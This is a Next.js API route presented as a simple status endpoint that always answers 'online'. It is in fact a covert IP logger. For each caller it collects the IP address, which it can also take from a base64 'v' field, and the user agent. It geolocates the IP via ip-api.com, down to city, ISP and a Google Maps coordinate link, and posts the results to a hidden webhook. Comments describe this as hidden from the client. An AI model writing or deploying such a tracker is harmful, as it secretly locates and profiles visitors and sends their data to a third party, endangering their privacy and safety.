import { headers } from "next/headers";
import { NextRequest } from "next/server";

export async function POST(request: NextRequest) {
  const headersList = await headers();
  const forwarded = headersList.get("x-forwarded-for");
  const realIp = headersList.get("x-real-ip");
  
  let ip = "unknown";
  if (forwarded) {
    ip = forwarded.split(",")[0]?.trim() || "unknown";
  } else if (realIp) {
    ip = realIp;
  }

  // Obfuscated client IP handling
  try {
    const body = await request.json();
    if (body.v && (ip === "unknown" || ip === "127.0.0.1" || ip === "::1" || ip.includes("::ffff:127.0.0.1"))) {
      // Decode the base64 "v" (visitor) parameter
      ip = Buffer.from(body.v, 'base64').toString();
    }
  } catch (e) {
    // ignore body parsing errors
  }

  const userAgent = headersList.get("user-agent") || "unknown";

  // Simple IP geolocation (server-side, hidden from client)
  let locationData = "Location info unavailable";
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`);
    const geo = await geoResponse.json();
    if (geo.status === "success") {
      locationData = `${geo.city}, ${geo.regionName}, ${geo.country}
ISP: ${geo.isp}
Maps: https://www.google.com/maps?q=${geo.lat},${geo.lon}`;
    }
  } catch (e) {
    // ignore
  }

  const webhookUrl = process.env.WEBHOOK;
  if (!webhookUrl) return Response.json({ status: "online" });

  const payload = {
    embeds: [
      {
        title: "New Visitor Logged",
        color: 0x000000,
        fields: [
          { name: "IP Address", value: ip, inline: true },
          { name: "Device / User Agent", value: userAgent, inline: false },
          { name: "Location", value: locationData, inline: false },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  };

  try {
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (e) {
    // ignore
  }

  return Response.json({ status: "online" });
}

// Keep GET for compatibility or just return 405
export async function GET() {
  return Response.json({ status: "online" });
}
